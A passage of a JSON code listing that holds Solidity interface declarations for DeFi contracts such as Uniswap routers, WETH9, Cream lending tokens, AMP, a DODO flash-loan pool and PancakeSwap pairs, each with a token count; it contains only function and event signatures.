                        "content": "interface Uni_Router_V3 {\n    struct ExactInputSingleParams {\n        address tokenIn;\n        address tokenOut;\n        uint24 fee;\n        address recipient;\n        uint256 deadline;\n        uint256 amountIn;\n        uint256 amountOutMinimum;\n        uint160 sqrtPriceLimitX96;\n    }\n\n    struct ExactOutputSingleParams {\n        address tokenIn;\n        address tokenOut;\n        uint24 fee;\n        address recipient;\n        uint256 deadline;\n        uint256 amountOut;\n        uint256 amountInMaximum;\n        uint160 sqrtPriceLimitX96;\n    }\n\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to\n    ) external payable returns (uint256 amountOut);\n\n    function exactInputSingle(\n        ExactInputSingleParams memory params\n    ) external payable returns (uint256 amountOut);\n\n    function exactOutputSingle(\n        ExactOutputSingleParams calldata params\n        ) external payable returns (uint256 amountIn);\n\n}\n",
                        "token_count": 212,
                        "imported": true
                    },
                    {
                        "name": "Uni_Router_V2",
                        "content": "interface Uni_Router_V2 {\n  function WETH() external view returns (address);\n\n  function addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 amountADesired,\n    uint256 amountBDesired,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  returns (\n    uint256 amountA,\n    uint256 amountB,\n    uint256 liquidity\n  );\n\n  function addLiquidityETH(\n    address token,\n    uint256 amountTokenDesired,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  payable\n  returns (\n    uint256 amountToken,\n    uint256 amountETH,\n    uint256 liquidity\n  );\n\n  function factory() external view returns (address);\n\n  function getAmountIn(\n    uint256 amountOut,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountIn);\n\n  function getAmountOut(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountOut);\n\n  function getAmountsIn(uint256 amountOut, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function getAmountsOut(uint256 amountIn, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function quote(\n    uint256 amountA,\n    uint256 reserveA,\n    uint256 reserveB\n  ) external pure returns (uint256 amountB);\n\n  function removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function removeLiquidityETH(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityETHWithPermit(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function swapETHForExactTokens(\n    uint256 amountOut,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable;\n\n  function swapExactTokensForETH(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForETHSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapExactTokensForTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapTokensForExactETH(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapTokensForExactTokens(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n  // receive () external payable;\n}\n",
                        "token_count": 1172,
                        "imported": true
                    },
                    {
                        "name": "WETH9",
                        "content": "interface WETH9 {\n  function name() external view returns (string memory);\n\n  function approve(address guy, uint256 wad) external returns (bool);\n\n  function totalSupply() external view returns (uint256);\n\n  function transferFrom(\n    address src,\n    address dst,\n    uint256 wad\n  ) external returns (bool);\n\n  function withdraw(uint256 wad) external;\n\n  function decimals() external view returns (uint8);\n\n  function balanceOf(address) external view returns (uint256);\n\n  function symbol() external view returns (string memory);\n\n  function transfer(address dst, uint256 wad) external returns (bool);\n\n  function deposit() external payable;\n\n  function allowance(address, address) external view returns (uint256);\n\n  event Approval(address indexed src, address indexed guy, uint256 wad);\n  event Transfer(address indexed src, address indexed dst, uint256 wad);\n  event Deposit(address indexed dst, uint256 wad);\n  event Withdrawal(address indexed src, uint256 wad);\n}\n",
                        "token_count": 210,
                        "imported": true
                    },
                    {
                        "name": "crETH",
                        "content": "interface crETH {\n  event AccrueInterest(\n    uint256 cashPrior,\n    uint256 interestAccumulated,\n    uint256 borrowIndex,\n    uint256 totalBorrows\n  );\n  event Approval(\n    address indexed owner,\n    address indexed spender,\n    uint256 amount\n  );\n  event Borrow(\n    address borrower,\n    uint256 borrowAmount,\n    uint256 accountBorrows,\n    uint256 totalBorrows\n  );\n  event Failure(uint256 error, uint256 info, uint256 detail);\n  event LiquidateBorrow(\n    address liquidator,\n    address borrower,\n    uint256 repayAmount,\n    address cTokenCollateral,\n    uint256 seizeTokens\n  );\n  event Mint(address minter, uint256 mintAmount, uint256 mintTokens);\n  event NewAdmin(address oldAdmin, address newAdmin);\n  event NewComptroller(address oldComptroller, address newComptroller);\n  event NewMarketInterestRateModel(\n    address oldInterestRateModel,\n    address newInterestRateModel\n  );\n  event NewPendingAdmin(address oldPendingAdmin, address newPendingAdmin);\n  event NewReserveFactor(\n    uint256 oldReserveFactorMantissa,\n    uint256 newReserveFactorMantissa\n  );\n  event Redeem(address redeemer, uint256 redeemAmount, uint256 redeemTokens);\n  event RepayBorrow(\n    address payer,\n    address borrower,\n    uint256 repayAmount,\n    uint256 accountBorrows,\n    uint256 totalBorrows\n  );\n  event ReservesAdded(\n    address benefactor,\n    uint256 addAmount,\n    uint256 newTotalReserves\n  );\n  event ReservesReduced(\n    address admin,\n    uint256 reduceAmount,\n    uint256 newTotalReserves\n  );\n  event Transfer(address indexed from, address indexed to, uint256 amount);\n\n  function _acceptAdmin() external returns (uint256);\n\n  function _reduceReserves(uint256 reduceAmount) external returns (uint256);\n\n  function _setComptroller(address newComptroller) external returns (uint256);\n\n  function _setInterestRateModel(address newInterestRateModel)\n  external\n  returns (uint256);\n\n  function _setPendingAdmin(address newPendingAdmin) external returns (uint256);\n\n  function _setReserveFactor(uint256 newReserveFactorMantissa)\n  external\n  returns (uint256);\n\n  function accrualBlockNumber() external view returns (uint256);\n\n  function accrueInterest() external returns (uint256);\n\n  function admin() external view returns (address);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 amount) external returns (bool);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function balanceOfUnderlying(address owner) external returns (uint256);\n\n  function borrow(uint256 borrowAmount) external returns (uint256);\n\n  function borrowBalanceCurrent(address account) external returns (uint256);\n\n  function borrowBalanceStored(address account) external view returns (uint256);\n\n  function borrowIndex() external view returns (uint256);\n\n  function borrowRatePerBlock() external view returns (uint256);\n\n  function comptroller() external view returns (address);\n\n  function decimals() external view returns (uint8);\n\n  function exchangeRateCurrent() external returns (uint256);\n\n  function exchangeRateStored() external view returns (uint256);\n\n  function getAccountSnapshot(address account)\n  external\n  view\n  returns (\n    uint256,\n    uint256,\n    uint256,\n    uint256\n  );\n\n  function getCash() external view returns (uint256);\n\n  function initialize(\n    address comptroller_,\n    address interestRateModel_,\n    uint256 initialExchangeRateMantissa_,\n    string memory name_,\n    string memory symbol_,\n    uint8 decimals_\n  ) external;\n\n  function interestRateModel() external view returns (address);\n\n  function isCToken() external view returns (bool);\n\n  function liquidateBorrow(address borrower, address cTokenCollateral)\n  external\n  payable;\n\n  function mint() external payable;\n\n  function name() external view returns (string memory);\n\n  function pendingAdmin() external view returns (address);\n\n  function redeem(uint256 redeemTokens) external returns (uint256);\n\n  function redeemUnderlying(uint256 redeemAmount) external returns (uint256);\n\n  function repayBorrow() external payable;\n\n  function repayBorrowBehalf(address borrower) external payable;\n\n  function reserveFactorMantissa() external view returns (uint256);\n\n  function seize(\n    address liquidator,\n    address borrower,\n    uint256 seizeTokens\n  ) external returns (uint256);\n\n  function supplyRatePerBlock() external view returns (uint256);\n\n  function symbol() external view returns (string memory);\n\n  function totalBorrows() external view returns (uint256);\n\n  function totalBorrowsCurrent() external returns (uint256);\n\n  function totalReserves() external view returns (uint256);\n\n  function totalSupply() external view returns (uint256);\n\n  function transfer(address dst, uint256 amount) external returns (bool);\n\n  function transferFrom(\n    address src,\n    address dst,\n    uint256 amount\n  ) external returns (bool);\n}\n",
                        "token_count": 1097,
                        "imported": true
                    },
                    {
                        "name": "crAMP",
                        "content": "interface crAMP {\n  event AccrueInterest(\n    uint256 cashPrior,\n    uint256 interestAccumulated,\n    uint256 borrowIndex,\n    uint256 totalBorrows\n  );\n  event Approval(\n    address indexed owner,\n    address indexed spender,\n    uint256 amount\n  );\n  event Borrow(\n    address borrower,\n    uint256 borrowAmount,\n    uint256 accountBorrows,\n    uint256 totalBorrows\n  );\n  event Failure(uint256 error, uint256 info, uint256 detail);\n  event LiquidateBorrow(\n    address liquidator,\n    address borrower,\n    uint256 repayAmount,\n    address cTokenCollateral,\n    uint256 seizeTokens\n  );\n  event Mint(address minter, uint256 mintAmount, uint256 mintTokens);\n  event NewAdmin(address oldAdmin, address newAdmin);\n  event NewComptroller(address oldComptroller, address newComptroller);\n  event NewImplementation(address oldImplementation, address newImplementation);\n  event NewMarketInterestRateModel(\n    address oldInterestRateModel,\n    address newInterestRateModel\n  );\n  event NewPendingAdmin(address oldPendingAdmin, address newPendingAdmin);\n  event NewReserveFactor(\n    uint256 oldReserveFactorMantissa,\n    uint256 newReserveFactorMantissa\n  );\n  event Redeem(address redeemer, uint256 redeemAmount, uint256 redeemTokens);\n  event RepayBorrow(\n    address payer,\n    address borrower,\n    uint256 repayAmount,\n    uint256 accountBorrows,\n    uint256 totalBorrows\n  );\n  event ReservesAdded(\n    address benefactor,\n    uint256 addAmount,\n    uint256 newTotalReserves\n  );\n  event ReservesReduced(\n    address admin,\n    uint256 reduceAmount,\n    uint256 newTotalReserves\n  );\n  event Transfer(address indexed from, address indexed to, uint256 amount);\n\n  function _acceptAdmin() external returns (uint256);\n\n  function _addReserves(uint256 addAmount) external returns (uint256);\n\n  function _reduceReserves(uint256 reduceAmount) external returns (uint256);\n\n  function _setComptroller(address newComptroller) external returns (uint256);\n\n  function _setImplementation(\n    address implementation_,\n    bool allowResign,\n    bytes memory becomeImplementationData\n  ) external;\n\n  function _setInterestRateModel(address newInterestRateModel)\n  external\n  returns (uint256);\n\n  function _setPendingAdmin(address newPendingAdmin) external returns (uint256);\n\n  function _setReserveFactor(uint256 newReserveFactorMantissa)\n  external\n  returns (uint256);\n\n  function accrualBlockNumber() external view returns (uint256);\n\n  function accrueInterest() external returns (uint256);\n\n  function admin() external view returns (address);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 amount) external returns (bool);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function balanceOfUnderlying(address owner) external returns (uint256);\n\n  function borrow(uint256 borrowAmount) external returns (uint256);\n\n  function borrowBalanceCurrent(address account) external returns (uint256);\n\n  function borrowBalanceStored(address account) external view returns (uint256);\n\n  function borrowIndex() external view returns (uint256);\n\n  function borrowRatePerBlock() external view returns (uint256);\n\n  function comptroller() external view returns (address);\n\n  function decimals() external view returns (uint8);\n\n  function delegateToImplementation(bytes memory data)\n  external\n  returns (bytes memory);\n\n  function delegateToViewImplementation(bytes memory data)\n  external\n  view\n  returns (bytes memory);\n\n  function exchangeRateCurrent() external returns (uint256);\n\n  function exchangeRateStored() external view returns (uint256);\n\n  function getAccountSnapshot(address account)\n  external\n  view\n  returns (\n    uint256,\n    uint256,\n    uint256,\n    uint256\n  );\n\n  function getCash() external view returns (uint256);\n\n  function implementation() external view returns (address);\n\n  function interestRateModel() external view returns (address);\n\n  function isCToken() external view returns (bool);\n\n  function liquidateBorrow(\n    address borrower,\n    uint256 repayAmount,\n    address cTokenCollateral\n  ) external returns (uint256);\n\n  function mint(uint256 mintAmount) external returns (uint256);\n\n  function name() external view returns (string memory);\n\n  function pendingAdmin() external view returns (address);\n\n  function redeem(uint256 redeemTokens) external returns (uint256);\n\n  function redeemUnderlying(uint256 redeemAmount) external returns (uint256);\n\n  function repayBorrow(uint256 repayAmount) external returns (uint256);\n\n  function repayBorrowBehalf(address borrower, uint256 repayAmount)\n  external\n  returns (uint256);\n\n  function reserveFactorMantissa() external view returns (uint256);\n\n  function seize(\n    address liquidator,\n    address borrower,\n    uint256 seizeTokens\n  ) external returns (uint256);\n\n  function supplyRatePerBlock() external view returns (uint256);\n\n  function symbol() external view returns (string memory);\n\n  function totalBorrows() external view returns (uint256);\n\n  function totalBorrowsCurrent() external returns (uint256);\n\n  function totalReserves() external view returns (uint256);\n\n  function totalSupply() external view returns (uint256);\n\n  function transfer(address dst, uint256 amount) external returns (bool);\n\n  function transferFrom(\n    address src,\n    address dst,\n    uint256 amount\n  ) external returns (bool);\n\n  function underlying() external view returns (address);\n}\n",
                        "token_count": 1205,
                        "imported": true
                    },
                    {
                        "name": "AMP",
                        "content": "interface AMP {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event ApprovalByPartition(\n    bytes32 indexed partition,\n    address indexed owner,\n    address indexed spender,\n    uint256 value\n  );\n  event AuthorizedOperator(\n    address indexed operator,\n    address indexed tokenHolder\n  );\n  event AuthorizedOperatorByPartition(\n    bytes32 indexed partition,\n    address indexed operator,\n    address indexed tokenHolder\n  );\n  event ChangedPartition(\n    bytes32 indexed fromPartition,\n    bytes32 indexed toPartition,\n    uint256 value\n  );\n  event CollateralManagerRegistered(address collateralManager);\n  event Minted(\n    address indexed operator,\n    address indexed to,\n    uint256 value,\n    bytes data\n  );\n  event OwnerUpdate(address indexed oldValue, address indexed newValue);\n  event OwnershipTransferAuthorization(address indexed authorizedAddress);\n  event PartitionStrategySet(\n    bytes4 flag,\n    string name,\n    address indexed implementation\n  );\n  event RevokedOperator(address indexed operator, address indexed tokenHolder);\n  event RevokedOperatorByPartition(\n    bytes32 indexed partition,\n    address indexed operator,\n    address indexed tokenHolder\n  );\n  event Swap(address indexed operator, address indexed from, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n  event TransferByPartition(\n    bytes32 indexed fromPartition,\n    address operator,\n    address indexed from,\n    address indexed to,\n    uint256 value,\n    bytes data,\n    bytes operatorData\n  );\n\n  function allowance(address _owner, address _spender)\n  external\n  view\n  returns (uint256);\n\n  function allowanceByPartition(\n    bytes32 _partition,\n    address _owner,\n    address _spender\n  ) external view returns (uint256);\n\n  function approve(address _spender, uint256 _value) external returns (bool);\n\n  function approveByPartition(\n    bytes32 _partition,\n    address _spender,\n    uint256 _value\n  ) external returns (bool);\n\n  function assumeOwnership() external;\n\n  function authorizeOperator(address _operator) external;\n\n  function authorizeOperatorByPartition(bytes32 _partition, address _operator)\n  external;\n\n  function authorizeOwnershipTransfer(address _authorizedAddress) external;\n\n  function authorizedNewOwner() external view returns (address);\n\n  function balanceOf(address _tokenHolder) external view returns (uint256);\n\n  function balanceOfByPartition(bytes32 _partition, address _tokenHolder)\n  external\n  view\n  returns (uint256);\n\n  function canImplementInterfaceForAddress(bytes32 _interfaceHash, address)\n  external\n  view\n  returns (bytes32);\n\n  function collateralManagers(uint256) external view returns (address);\n\n  function decimals() external pure returns (uint8);\n\n  function decreaseAllowance(address _spender, uint256 _subtractedValue)\n  external\n  returns (bool);\n\n  function decreaseAllowanceByPartition(\n    bytes32 _partition,\n    address _spender,\n    uint256 _subtractedValue\n  ) external returns (bool);\n\n  function defaultPartition() external view returns (bytes32);\n\n  function granularity() external pure returns (uint256);\n\n  function increaseAllowance(address _spender, uint256 _addedValue)\n  external\n  returns (bool);\n\n  function increaseAllowanceByPartition(\n    bytes32 _partition,\n    address _spender,\n    uint256 _addedValue\n  ) external returns (bool);\n\n  function isCollateralManager(address _collateralManager)\n  external\n  view\n  returns (bool);\n\n  function isOperator(address _operator, address _tokenHolder)\n  external\n  view\n  returns (bool);\n\n  function isOperatorForCollateralManager(\n    bytes32 _partition,\n    address _operator,\n    address _collateralManager\n  ) external view returns (bool);\n\n  function isOperatorForPartition(\n    bytes32 _partition,\n    address _operator,\n    address _tokenHolder\n  ) external view returns (bool);\n\n  function isPartitionStrategy(bytes4 _prefix) external view returns (bool);\n\n  function name() external view returns (string memory);\n\n  function owner() external view returns (address);\n\n  function partitionStrategies(uint256) external view returns (bytes4);\n\n  function partitionsOf(address _tokenHolder)\n  external\n  view\n  returns (bytes32[] memory);\n\n  function registerCollateralManager() external;\n\n  function revokeOperator(address _operator) external;\n\n  function revokeOperatorByPartition(bytes32 _partition, address _operator)\n  external;\n\n  function setPartitionStrategy(bytes4 _prefix, address _implementation)\n  external;\n\n  function swap(address _from) external;\n\n  function swapToken() external view returns (address);\n\n  function swapTokenGraveyard() external view returns (address);\n\n  function symbol() external view returns (string memory);\n\n  function totalPartitions() external view returns (bytes32[] memory);\n\n  function totalSupply() external view returns (uint256);\n\n  function totalSupplyByPartition(bytes32) external view returns (uint256);\n\n  function transfer(address _to, uint256 _value) external returns (bool);\n\n  function transferByPartition(\n    bytes32 _partition,\n    address _from,\n    address _to,\n    uint256 _value,\n    bytes memory _data,\n    bytes memory _operatorData\n  ) external returns (bytes32);\n\n  function transferFrom(\n    address _from,\n    address _to,\n    uint256 _value\n  ) external returns (bool);\n}\n",
                        "token_count": 1130,
                        "imported": true
                    },
                    {
                        "name": "IUSDC",
                        "content": "interface IUSDC {\n  function Swapin(\n    bytes32 txhash,\n    address account,\n    uint256 amount\n  ) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function balanceOf(address) external view returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n}\n",
                        "token_count": 76,
                        "imported": true
                    },
                    {
                        "name": "IBaseV1Router01",
                        "content": "interface IBaseV1Router01 {\n  function addLiquidity(\n    address tokenA,\n    address tokenB,\n    bool stable,\n    uint256 amountADesired,\n    uint256 amountBDesired,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  returns (\n    uint256 amountA,\n    uint256 amountB,\n    uint256 liquidity\n  );\n\n  function swapExactTokensForTokensSimple(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address tokenFrom,\n    address tokenTo,\n    bool stable,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n}\n",
                        "token_count": 152,
                        "imported": true
                    },
                    {
                        "name": "IDeiLenderSolidex",
                        "content": "interface IDeiLenderSolidex {\n  function addCollateral(address to, uint256 amount) external;\n\n  function borrow(\n    address to,\n    uint256 amount,\n    uint256 price,\n    uint256 timestamp,\n    bytes memory reqId,\n    SchnorrSign[] memory sigs\n  ) external returns (uint256 debt);\n}\n",
                        "token_count": 71,
                        "imported": true
                    },
                    {
                        "name": "ISSPv4",
                        "content": "interface ISSPv4 {\n  function buyDei(uint256 amountIn) external;\n}\n",
                        "token_count": 19,
                        "imported": true
                    },
                    {
                        "name": "ILpDepositor",
                        "content": "interface ILpDepositor {\n  function deposit(address pool, uint256 amount) external;\n}\n",
                        "token_count": 20,
                        "imported": true
                    },
                    {
                        "name": "IOracle",
                        "content": "interface IOracle {\n  function getOnChainPrice() external view returns (uint256);\n}\n",
                        "token_count": 19,
                        "imported": true
                    },
                    {
                        "name": "DVM",
                        "content": "interface DVM {\n  function flashLoan(\n    uint256 baseAmount,\n    uint256 quoteAmount,\n    address assetTo,\n    bytes calldata data\n  ) external;\n\n  function init(\n    address maintainer,\n    address baseTokenAddress,\n    address quoteTokenAddress,\n    uint256 lpFeeRate,\n    address mtFeeRateModel,\n    uint256 i,\n    uint256 k,\n    bool isOpenTWAP\n  ) external;\n\n  function _BASE_TOKEN_() external returns(address);\n  function _QUOTE_TOKEN_() external returns(address);\n}\n",
                        "token_count": 114,
                        "imported": true
                    },
                    {
                        "name": "Surge",
                        "content": "interface Surge {\n  function sell(uint256 tokenAmount) external returns (bool);\n\n  function balanceOf(address account) external view returns (uint256);\n\n  function transfer(address recipient, uint256 amount) external returns (bool);\n}\n",
                        "token_count": 46,
                        "imported": true
                    },
                    {
                        "name": "USDT",
                        "content": "interface USDT {\n  function transfer(address to, uint256 value) external;\n\n  function balanceOf(address account) external view returns (uint256);\n\n  function approve(address spender, uint256 value) external;\n}\n",
                        "token_count": 43,
                        "imported": true
                    },
                    {
                        "name": "IMasterChef",
                        "content": "interface IMasterChef {\n  event Deposit(address indexed user, uint256 indexed pid, uint256 amount);\n  event EmergencyWithdraw(\n    address indexed user,\n    uint256 indexed pid,\n    uint256 amount\n  );\n  event Withdraw(address indexed user, uint256 indexed pid, uint256 amount);\n  event WithdrawChange(\n    address indexed user,\n    address indexed token,\n    uint256 change\n  );\n\n  function BONUS_MULTIPLIER() external view returns (uint256);\n\n  function WETH() external view returns (address);\n\n  function _become(address proxy) external;\n\n  function _totalClaimed(address, uint256) external view returns (uint256);\n\n  function _whitelist(address) external view returns (address);\n\n  function add(\n    uint256 _allocPoint,\n    address _lpToken,\n    uint256 _pooltype,\n    address _ticket,\n    bool _withUpdate\n  ) external;\n\n  function admin() external view returns (address);\n\n  function bonusEndBlock() external view returns (uint256);\n\n  function check_vip_limit(\n    uint256 ticket_level,\n    uint256 ticket_count,\n    uint256 amount\n  ) external view returns (uint256 allowed, uint256 overflow);\n\n  function claimFeeRate() external view returns (uint256);\n\n  function deposit(uint256 _pid, uint256 _amount) external;\n\n  function depositByAddLiquidity(\n    uint256 _pid,\n    address[2] memory _tokens,\n    uint256[2] memory _amounts\n  ) external;\n\n  function depositByAddLiquidityETH(\n    uint256 _pid,\n    address _token,\n    uint256 _amount\n  ) external payable;\n\n  function depositSingle(\n    uint256 _pid,\n    address _token,\n    uint256 _amount,\n    address[][2] memory paths,\n    uint256 _minTokens\n  ) external payable;\n\n  function depositSingleTo(\n    address _user,\n    uint256 _pid,\n    address _token,\n    uint256 _amount,\n    address[][2] memory paths,\n    uint256 _minTokens\n  ) external payable;\n\n  function depositTo(\n    uint256 _pid,\n    uint256 _amount,\n    address _user\n  ) external;\n\n  function deposit_all_tickets(address ticket) external;\n\n  function dev(address _devaddr) external;\n\n  function devaddr() external view returns (address);\n\n  function emergencyWithdraw(uint256 _pid) external;\n\n  function farmPercent(uint256) external view returns (uint8);\n\n  function feeDistributor() external view returns (address);\n\n  function getMultiplier(uint256 _from, uint256 _to)\n  external\n  view\n  returns (uint256);\n\n  function implementation() external view returns (address);\n\n  function initialize(\n    address _t42,\n    address _treasury,\n    address _feeDistributor,\n    address _devaddr,\n    uint256 _bonusEndBlock,\n    address _WETH,\n    address _paraRouter\n  ) external;\n\n  function massUpdatePools() external;\n\n  function migrate(uint256 _pid) external;\n\n  function migrator() external view returns (address);\n\n  function onERC721Received(\n    address,\n    address,\n    uint256,\n    bytes memory\n  ) external returns (bytes4);\n\n  function paraRouter() external view returns (address);\n\n  function pendingAdmin() external view returns (address);\n\n  function pendingImplementation() external view returns (address);\n\n  function pendingT42(uint256 _pid, address _user)\n  external\n  view\n  returns (uint256 pending, uint256 fee);\n\n  function poolInfo(uint256)\n  external\n  view\n  returns (\n    address lpToken,\n    uint256 allocPoint,\n    uint256 lastRewardBlock,\n    uint256 accT42PerShare,\n    address ticket,\n    uint256 pooltype\n  );\n\n  function poolLength() external view returns (uint256);\n\n  function poolsTotalDeposit(uint256) external view returns (uint256);\n\n  function set(\n    uint256 _pid,\n    uint256 _allocPoint,\n    bool _withUpdate\n  ) external;\n\n  function setClaimFeeRate(uint256 newRate) external;\n\n  function setFarmPercents(uint8[] memory percents) external;\n\n  function setFeeDistributor(address _newAddress) external;\n\n  function setMigrator(address _migrator) external;\n\n  function setRouter(address _router) external;\n\n  function setT42(address _t42) external;\n\n  function setTreasury(address _treasury) external;\n\n  function setWhitelist(address _whtie, address accpeter) external;\n\n  function setWithdrawFeeRate(uint256 newRate) external;\n\n  function startBlock() external view returns (uint256);\n\n  function t42() external view returns (address);\n\n  function t42PerBlock(uint8 index) external view returns (uint256);\n\n  function ticket_staked_array(address who, address ticket)\n  external\n  view\n  returns (uint256[] memory);\n\n  function ticket_staked_count(address who, address ticket)\n  external\n  view\n  returns (uint256);\n\n  function ticket_stakes(\n    address,\n    address,\n    uint256\n  ) external view returns (uint256);\n\n  function totalAllocPoint() external view returns (uint256);\n\n  function totalClaimed(\n    address _user,\n    uint256 pooltype,\n    uint256 index\n  ) external view returns (uint256);\n\n  function treasury() external view returns (address);\n\n  function updatePool(uint256 _pid) external;\n\n  function userChange(address, address) external view returns (uint256);\n\n  function userInfo(uint256, address)\n  external\n  view\n  returns (uint256 amount, uint256 rewardDebt);\n\n  function withdraw(uint256 _pid, uint256 _amount) external;\n\n  function withdrawAndRemoveLiquidity(\n    uint256 _pid,\n    uint256 _amount,\n    bool isBNB\n  ) external;\n\n  function withdrawChange(address[] memory tokens) external;\n\n  function withdrawFeeRate() external view returns (uint256);\n\n  function withdrawSingle(\n    address tokenOut,\n    uint256 _pid,\n    uint256 _amount,\n    address[][2] memory paths\n  ) external;\n\n  function withdraw_tickets(uint256 _pid, uint256 tokenId) external;\n}\n",
                        "token_count": 1315,
                        "imported": true
                    },
                    {
                        "name": "IPancakeCallee",
                        "content": "interface IPancakeCallee {\n  function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external;\n}\n",
                        "token_count": 31,
                        "imported": true
                    },
                    {
                        "name": "IPancakePair",
                        "content": "interface IPancakePair {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external pure returns (string memory);\n\n  function symbol() external pure returns (string memory);\n\n  function decimals() external pure returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n\n  function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n  function PERMIT_TYPEHASH() external pure returns (bytes32);\n\n  function nonces(address owner) external view returns (uint256);\n\n  function permit(\n    address owner,\n    address spender,\n    uint256 value,\n    uint256 deadline,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external;\n\n  event Mint(address indexed sender, uint256 amount0, uint256 amount1);\n  event Burn(\n    address indexed sender,\n    uint256 amount0,\n    uint256 amount1,\n    address indexed to\n  );\n  event Swap(\n    address indexed sender,\n    uint256 amount0In,\n    uint256 amount1In,\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address indexed to\n  );\n  event Sync(uint112 reserve0, uint112 reserve1);\n\n  function MINIMUM_LIQUIDITY() external pure returns (uint256);\n\n  function factory() external view returns (address);\n\n  function token0() external view returns (address);\n\n  function token1() external view returns (address);\n\n  function getReserves()\n  external\n  view\n  returns (\n    uint112 reserve0,\n    uint112 reserve1,\n    uint32 blockTimestampLast\n  );\n\n  function price0CumulativeLast() external view returns (uint256);\n\n  function price1CumulativeLast() external view returns (uint256);\n\n  function kLast() external view returns (uint256);\n\n  function mint(address to) external returns (uint256 liquidity);\n\n  function burn(address to) external returns (uint256 amount0, uint256 amount1);\n\n  function swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes calldata data\n  ) external;\n\n  function skim(address to) external;\n\n  function sync() external;\n\n  function initialize(address, address) external;\n}\n",
                        "token_count": 569,
                        "imported": true
                    },
                    {
                        "name": "IPancakeRouter",
